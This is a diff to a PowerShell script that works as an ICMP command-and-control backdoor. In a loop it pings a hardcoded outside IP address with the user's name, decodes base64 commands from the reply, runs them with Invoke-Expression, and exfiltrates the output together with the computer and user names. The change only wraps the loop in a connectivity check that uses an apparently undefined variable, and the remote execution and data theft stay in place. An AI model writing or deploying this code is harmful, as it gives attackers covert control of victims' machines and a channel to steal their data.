@@ -43,14 +43,16 @@ Function Stop-PreviousProcesses {
 Stop-PreviousProcesses
 $sleep = 10; $target = "104.248.16.121"
 while ($true) {
-    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
-    $json = @{h=$env:USERNAME} | ConvertTo-Json
-    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($json)) 
-    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
-    if ($r -match "^c:(..*)$") {
-        $command = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($matches[1]))
-        $out = Invoke-Expression $command 2>&1|out-string
-        Invoke-ICMPExfil -Payload $out -Target $target -HostName "$env:COMPUTERNAME-$env:USERNAME" -MaxSize 1000
+    if (Test-Connection -computer $site -count 1 -quiet) {
+        $ICMPClient = New-Object System.Net.NetworkInformation.Ping
+        $json = @{h=$env:USERNAME} | ConvertTo-Json
+        $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($json)) 
+        $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
+        if ($r -match "^c:(..*)$") {
+            $command = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($matches[1]))
+            $out = Invoke-Expression $command 2>&1|out-string
+            Invoke-ICMPExfil -Payload $out -Target $target -HostName "$env:COMPUTERNAME-$env:USERNAME" -MaxSize 1000
+        }
     }
     start-sleep $sleep
 }
